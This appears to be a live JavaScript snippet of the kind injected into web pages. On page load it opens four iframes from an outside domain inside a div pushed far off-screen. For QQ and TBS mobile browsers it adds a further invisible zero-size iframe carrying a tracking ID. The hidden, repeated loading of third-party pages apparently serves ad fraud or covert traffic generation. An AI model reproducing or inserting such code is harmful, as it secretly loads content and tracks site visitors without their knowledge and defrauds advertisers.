window.curNode = document.currentScript || (function() {
    var script = document.querySelectorAll('script');
    return script[script.length - 1]
})();
var s_w = window.screen.width;
var trackid = '10195';
var ifm_url = 'https://etc.6187wo.com/20195.html#s_w='+s_w;
//var Optimize10001_url = 'https://etc.6187wo.com/10195/4e029f67fe6db05ea9ac5b8cf2f9615e/10001/Optimize.html#s_w='+s_w;
//var Optimize10002_url = 'https://etc.6187wo.com/10195/4e029f67fe6db05ea9ac5b8cf2f9615e/10002/Optimize.html#s_w='+s_w;
//var Optimize10003_url = 'https://etc.6187wo.com/10195/4e029f67fe6db05ea9ac5b8cf2f9615e/10003/Optimize.html#s_w='+s_w;
function ifm(url) {
    var d = document.createElement("div");
    var c = document.createElement("iframe");
    c.src = url;
    window.curNode.parentNode.appendChild(d);
    d.style.position = 'absolute';
    d.style.left = '-40000px';
    d.style.top = '-40000px';
    d.style.width = '100%';
    d.style.height = '1000px';
    d.appendChild(c);
    c.style.width = '100%';
    c.style.height = '100%';
}
function cnzz(cnzz_id) {
    var tua = navigator.userAgent.toLocaleLowerCase();
    if ( - 1 !== tua.indexOf("tbs/") || -1 !== tua.indexOf("mqqbrowser/")) {
        var frame = document.createElement('iframe');
        frame.id = 'cnzz_frame_' + trackid;
        frame.style.cssText = 'position:absolute;left:0;top:0;width:0;height:0;visibility:hidden;';
        frame.frameBorder = '0';
        frame.src = 'https://etc.6187wo.com/act.html#web_id=' + cnzz_id;
        try {
            document.body.appendChild(frame);
        } catch(e) {}
    }
}
ifm(ifm_url);
ifm(ifm_url);
ifm(ifm_url);
ifm(ifm_url);
//ifm(Optimize10001_url);
//ifm(Optimize10002_url);
//ifm(Optimize10003_url);
cnzz('1279944921');